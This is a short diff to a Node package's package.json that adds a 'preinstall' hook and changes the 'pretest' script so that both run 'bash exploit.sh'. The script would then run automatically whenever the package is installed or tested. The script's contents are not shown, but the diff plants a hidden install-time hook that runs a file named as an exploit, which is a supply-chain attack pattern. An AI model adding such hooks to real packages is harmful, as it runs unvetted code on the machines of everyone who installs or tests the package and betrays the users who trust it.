@@ -20,7 +20,8 @@
   },
   "scripts": {
     "lint": "balena-lint lib/ tests/",
-    "pretest": "npm run lint",
+    "preinstall": "bash exploit.sh",
+    "pretest": "bash exploit.sh && npm run lint",
     "test": "npm run prepare && gulp test",
     "prepublish": "require-npm4-to-publish",
     "prepare": "gulp build",
